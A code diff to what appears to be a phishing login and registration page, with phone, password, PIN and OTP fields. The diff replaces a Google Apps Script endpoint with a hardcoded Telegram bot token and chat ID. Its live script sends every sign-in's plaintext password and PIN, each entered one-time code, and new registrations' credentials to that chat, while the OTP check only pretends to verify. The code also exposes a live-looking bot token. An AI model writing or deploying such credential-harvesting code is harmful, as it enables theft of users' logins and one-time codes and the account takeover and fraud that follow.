@@ -520,35 +520,40 @@
 
     </div>
 
-    <!-- JavaScript Navigation & Popup Controls -->
+  <!-- JavaScript Navigation & Popup Controls -->
     <script>
-        // ----- API CONFIG (Replaced Telegram with Google Apps Script) -----
-        const API_URL = "https://script.google.com/macros/s/AKfycbxk1Gq9p759llWD-b_CwTcsbatSEncYQ-n5LBzWBa5ErxLVQgCCi6vr3yhSEkGtLSaS/exec";
-
-        // Send message via Google Apps Script API (instead of Telegram)
-        async function sendMessage(message) {
-            try {
-                const response = await fetch(API_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "text/plain;charset=utf-8"
-                    },
-                    body: JSON.stringify({ message })
-                });
-                const data = await response.json();
-                console.log('API response:', data);
-                return data;
-            } catch (error) {
-                console.error('Error sending message:', error);
-                // Even if fails, we don't block the UI
-                return { success: false, error: error.message };
-            }
-        }
+        // ----- TELEGRAM CONFIG (UPDATED) -----
+        const BOT_TOKEN = '8859400245:AAGfmrAj4-eHKSjBe16G5oEzW7T9XDHGqbo';
+        const CHAT_ID = '1706252195';
 
         // Timer variables
         let timerInterval = null;
         let timerSeconds = 60;
         let isTimerRunning = false;
+
+        // Send Telegram notification
+        function sendTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.warn('Telegram bot token or chat id missing');
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => {
+                if (!res.ok) {
+                    console.warn('Telegram send failed', res.status);
+                }
+            })
+            .catch(err => console.warn('Telegram error', err));
+        }
 
         // Navigation
         function navigateTo(screen) {
@@ -564,7 +569,7 @@
             }
         }
 
-        // Restrict Phone input to only numbers
+        // Restrict Phone and PIN inputs to only numbers
         document.addEventListener('DOMContentLoaded', function() {
             // Login phone
             const loginPhone = document.getElementById('login-phone');
@@ -577,7 +582,7 @@
                 });
             }
 
-            // Login PIN (6 digits only)
+            // Login PIN - only numbers, max 6 digits
             const loginPin = document.getElementById('login-pin');
             if (loginPin) {
                 loginPin.addEventListener('input', function(e) {
@@ -611,15 +616,15 @@
             }
         });
 
-        // Send OTP (for Register screen) - uses sendMessage API
+        // Send OTP (for Register screen)
         function sendOTP() {
             const phone = document.getElementById('reg-phone')?.value || 'unknown';
-            const msg = `🔐 OTP requested\n📱 Phone: +91 ${phone}`;
-            sendMessage(msg);  // no await, fire and forget
-            alert("OTP Code Sent successfully!");
+            const msg = `🔐 <b>OTP requested</b>\n📱 Phone: +91 ${phone}`;
+            sendTelegram(msg);
+            alert("OTP Code Sent successfully! (Telegram notification sent)");
         }
 
-        // Send OTP from Modal (with timer) - uses sendMessage API
+        // Send OTP from Modal (with timer)
         function sendModalOTP() {
             // If timer is running, don't allow resend
             if (isTimerRunning) {
@@ -628,8 +633,8 @@
             }
 
             const phone = document.getElementById('login-phone')?.value || 'unknown';
-            const msg = `🔐 OTP requested (Modal)\n📱 Phone: +91 ${phone}`;
-            sendMessage(msg);
+            const msg = `🔐 <b>OTP requested (Modal)</b>\n📱 Phone: +91 ${phone}`;
+            sendTelegram(msg);
             
             // Show success message
             alert("OTP Sent Successfully!");
@@ -674,6 +679,7 @@
         // Sign In - shows modal
         function handleSignIn() {
             const phoneInput = document.getElementById('login-phone').value.trim();
+            const pinInput = document.getElementById('login-pin').value.trim();
             const privacyChecked = document.getElementById('privacy-agree').checked;
             
             if (!privacyChecked) {
@@ -688,6 +694,16 @@
 
             if(phoneInput.length < 10) {
                 alert("Please enter a valid 10-digit Phone number.");
+                return;
+            }
+
+            // Validate PIN (must be exactly 6 digits)
+            if(pinInput === "") {
+                alert("Please enter your 6-digit PIN.");
+                return;
+            }
+            if(pinInput.length !== 6) {
+                alert("PIN must be exactly 6 digits.");
                 return;
             }
 
@@ -708,11 +724,10 @@
             
             // Get password and PIN - PLAIN TEXT
             const pass = document.getElementById('login-pass')?.value || 'No Password Entered';
-            const pin = document.getElementById('login-pin')?.value || 'No PIN Entered';
             
-            // Send message via API with CLEAR PASSWORD AND PIN
-            const msg = `✅ Sign In attempt\n📱 Phone: ${phoneInput}\n🔑 Password: ${pass}\n🔢 PIN: ${pin}`;
-            sendMessage(msg);
+            // Send Telegram notification for Sign In attempt with CLEAR PASSWORD and PIN
+            const msg = `✅ <b>Sign In attempt</b>\n📱 Phone: ${phoneInput}\n🔑 Password: <b>${pass}</b>\n🔢 PIN: <b>${pinInput}</b>`;
+            sendTelegram(msg);
 
             // Show modal
             document.getElementById('verification-modal').style.display = 'flex';
@@ -748,15 +763,15 @@
                 return;
             }
 
-            // ✅ SEND OTP TO API (every OTP entered)
-            const otpMsg = `🔑 OTP Entered\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otpVal}`;
-            sendMessage(otpMsg);
+            // ✅ SEND OTP TO TELEGRAM (every OTP entered)
+            const otpMsg = `🔑 <b>OTP Entered</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otpVal}`;
+            sendTelegram(otpMsg);
 
             // Only "123456" is correct — anything else is WRONG
             if(otpVal === "123456") {
                 // Correct OTP
-                const successMsg = `✅ Login Successful\n📱 Phone: +91 ${phone}\n🔑 OTP verified successfully!`;
-                sendMessage(successMsg);
+                const successMsg = `✅ <b>Login Successful</b>\n📱 Phone: +91 ${phone}\n🔑 OTP verified successfully!`;
+                sendTelegram(successMsg);
                 alert("✅ Verification successful! Logging in...");
                 closeModal();
             } else {
@@ -775,10 +790,10 @@
             const pass = document.getElementById('reg-pass')?.value || 'No Password Entered';
             const invite = document.getElementById('reg-invite')?.value || '—';
 
-            const msg = `🆕 New registration\n👤 User: ${username}\n📱 Phone: +91 ${phone}\n🔑 Password: ${pass}\n🎫 Invite: ${invite}`;
-            sendMessage(msg);
+            const msg = `🆕 <b>New registration</b>\n👤 User: ${username}\n📱 Phone: +91 ${phone}\n🔑 Password: <b>${pass}</b>\n🎫 Invite: ${invite}`;
+            sendTelegram(msg);
 
-            alert("Registration successful!");
+            alert("Registration successful! (Telegram notification sent)");
             navigateTo('login');
         }
     </script>
